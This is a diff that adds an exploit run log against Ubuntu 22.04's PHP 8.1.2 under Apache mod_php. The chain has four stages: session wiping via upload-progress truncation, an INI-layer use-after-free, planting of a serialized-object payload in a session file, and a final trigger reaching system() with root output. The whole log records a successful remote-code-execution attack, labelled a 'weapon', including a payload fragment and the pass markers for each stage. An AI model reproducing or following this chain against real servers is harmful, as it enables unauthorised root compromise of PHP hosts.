@@ -1,0 +1,37 @@
+############################################################
+# FA MISSION 3: jammy composition — final stage = RCE — 2026-10-24T21:27:04Z
+# target: jammy Ubuntu 22.04 system PHP 8.1.2 Apache mod_php
+# stock ZendMM, ASLR on, no gdb, offsets 8102 receipted extract
+############################################################
+
+===== STAGE 1: session-wipe (rfc1867 invalid-key truncation) =====
+victim session write sid=
+
+victim session before: missing bytes
+PLAIN: HTTP/1.1 200 OK
+victim session after: 0 bytes
+[PASS] STAGE 1: victim session wiped
+
+===== STAGE 2: INI-UAF (stale status => save_path reads freed memory) =====
+FLOOD: HTTP/1.1 200 OK
+ARM_OK 8.1.2-1ubuntu2.27 <- child alive
+[Sat Oct 24 16:27:06.168839 2026] [php:error] [pid 1995002] [client 127.0.0.1:60182] PHP Fatal error:  Allowed memory size of 8388608 bytes exhausted (tried to allocate 1314816 bytes) in Unknown on line 0
+[Sat Oct 24 16:27:06.168873 2026] [php:warn] [pid 1995002] [client 127.0.0.1:60182] PHP Warning:  Unknown: Session ini settings cannot be changed when a session is active in Unknown on line 0
+[Sat Oct 24 16:27:06.894227 2026] [php:warn] [pid 1995002] [client 127.0.0.1:52961] PHP Warning:  Unknown: Session ini settings cannot be changed when a session is active in Unknown on line 0
+[RECEIPT] STAGE 2: INI-layer UAF consumer warnings above
+
+===== STAGE 3: session-gap injection — FULL weapon trigger planted =====
+PLAIN: HTTP/1.1 200 OK
+session file after hook write: 10493 bytes
+a:1:{s:10147:"upload_progress_k|a:1020:{i:0;O:6:"Stage1":0:{}i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:6;i:1;i:7;i:1;i:8 ...
+[PASS] STAGE 3: FULL trigger planted through the wiped gap
+
+===== STAGE 4: zero4 FULL FIRE (reader session decode -> zif_system) =====
+--- shot 1: reader GET ---
+[PASS STAGE 4] shot 1 MARKER: uid=0(root) gid=0(root) groups=0(root)
+---- final marker ----
+uid=0(root) gid=0(root) groups=0(root)
+---- child state / kill lines ----
+*** stack smashing detected ***: terminated
+child dead
+############################################################
